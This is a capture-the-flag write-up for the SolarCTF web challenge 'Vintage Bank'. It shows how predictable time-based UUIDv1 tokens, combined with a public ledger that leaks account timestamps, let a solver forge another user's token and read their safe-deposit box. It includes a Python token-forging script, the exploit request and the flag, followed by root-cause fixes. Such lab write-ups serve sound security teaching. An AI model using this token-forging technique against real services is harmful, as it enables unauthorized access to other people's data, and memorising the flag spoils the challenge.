# Vintage Bank

**Event:** SolarCTF
**Category:** web
**Flag:** `SOLARCTF{idor_s4fe_d3posit_b0x}`

---

| | |
|---|---|
| **Category** | Web |
| **Flag** | `SOLARCTF{idor_s4fe_d3posit_b0x}` |
| **Vuln** | IDOR via predictable UUIDv1 + timestamp leak |

## TL;DR

Safe deposit boxes are accessed with a UUID token at `/api/cell/<uuid>`. The tokens are **UUID version 1** (time-based) with a fixed clock sequence, a fixed MAC address, and whole-second timestamps. A public ledger at `/api/ledger` leaks every customer's account opening time to the second. Rebuilding the UUID of the odd-one-out customer from their timestamp opens their box, and the API never checks ownership.

## 1. Recon

The site is a little point-and-click bank. Ringing the bell at the teller window (`POST /api/rent`) issues a key card with a cell number and a UUID. Clicking the vault takes you to:

```
https://vintage-bank.solarctf.ru/#/cell/<uuid>
```

which calls `GET /api/cell/<uuid>` and returns:

```json
{"cell": 6, "owner": "...", "flag": "..."}
```

A wrong token returns `{"cell": null, "owner": null, "flag": null}`.

> Gotcha: the frontend still draws a vault for invalid tokens, computing the cell number client-side with `parseInt(uuid.slice(0,6), 16) % 30 + 1`. Random input like `ilovemygrandma` shows `№NaN`. This is cosmetic and not a vulnerability; always check the raw API response.

## 2. Analyzing the UUIDs

Two keys issued a few minutes apart:

```
be402a80-ca1b-11f1-9a2b-0242ac110002
78379680-ca1c-11f1-9a2b-0242ac110002
```

- The third group starts with `1` → **UUID version 1** (time-based, not random).
- `9a2b` (clock sequence) is identical in both.
- `0242ac110002` (node) is identical in both. `02:42:ac:11:00:02` is a typical Docker container MAC.
- Only the timestamp (`time_low` + `time_mid` + `time_hi`) changes.

Decoding the 60-bit timestamp (100 ns ticks since 1582-10-15):

```python
t = (0x1f1 << 48) | (0xca1b << 32) | 0xbe402a80
unix = (t - 0x01B21DD213814000) / 1e7   # -> 2026-10-17 11:13:13.0 UTC
```

The two keys differ by exactly **3,120,000,000 ticks = 312.0 s**, and the fractional part of each timestamp is **0**. The server only uses **whole seconds**, so a known creation time maps to exactly one UUID.

## 3. Finding the Timestamp Leak

Reading the frontend JS reveals an endpoint used by the "deposit book" on the hall floor:

```js
const r = await fetch('api/ledger');
```

`GET /api/ledger` returns all depositors with their **opening date and time**:

```json
[
  {"ord": 1,  "name": "Иванов М.",  "date": "21.07.2026 12:32:35", "cell": 28},
  ...
  {"ord": 13, "name": "Уточкин С.", "date": "23.04.2026 12:22:34", "cell": 6},
  ...
]
```

The in-game text even hints at it: *"Похоже, кто-то из сотрудников забыл важный документ…"* ("Looks like an employee forgot an important document…").

## 4. Picking the Target

The names are almost all taken from a list of the most common Russian surnames (Smirnov, Ivanov, Kuznetsova, Sokolov, Popova...). One doesn't belong: **Уточкин С.** ("little duckling"), opened `23.04.2026 12:22:34`, cell 6.

## 5. Exploitation

Rebuild the UUIDv1 from the timestamp, reusing the known clock sequence and node:

```python
import datetime as d

date, tz = "23.04.2026 12:22:34", 0   # ledger times turned out to be UTC
dt = d.datetime.strptime(date, "%d.%m.%Y %H:%M:%S") - d.timedelta(hours=tz)
t = int(dt.replace(tzinfo=d.timezone.utc).timestamp()) * 10**7 + 0x01B21DD213814000
print(f"{t & 0xffffffff:08x}-{(t >> 32) & 0xffff:04x}-"
      f"{((t >> 48) & 0x0fff) | 0x1000:04x}-9a2b-0242ac110002")
```

| Timezone tried | UUID | Result |
|---|---|---|
| UTC+3 (Moscow) | `f5fb6900-3ef5-11f1-9a2b-0242ac110002` | all `null` |
| **UTC** | `1b48a100-3f0f-11f1-9a2b-0242ac110002` | **flag** |

```
GET /api/cell/1b48a100-3f0f-11f1-9a2b-0242ac110002
```

```json
{"cell": 6, "owner": "Уточкин С.", "flag": "SOLARCTF{idor_s4fe_d3posit_b0x}"}
```

## Flag

```
SOLARCTF{idor_s4fe_d3posit_b0x}
```

## Root Cause & Fix

1. **Broken access control (IDOR):** `/api/cell/<uuid>` returns a box to anyone holding the token, with no check that the box belongs to the current session. The server should authorize every request against the logged-in user.
2. **Predictable identifiers:** UUIDv1 leaks its creation time and host MAC. Secret tokens should come from a CSPRNG (e.g. UUIDv4 or `secrets.token_urlsafe()`). Unguessable IDs are defense in depth, not a replacement for authorization.
3. **Information disclosure:** `/api/ledger` exposes exact creation timestamps, which is the missing piece needed to forge tokens. Sensitive metadata shouldn't be served to unauthenticated users.

## Takeaways

- "We use UUIDs, so they can't be guessed" is only true for **v4**. Always check the version nibble.
- Two samples of an identifier tell you a lot: what's fixed, what changes, and by how much.
- Read the frontend JS. Hidden API endpoints are often sitting right there.
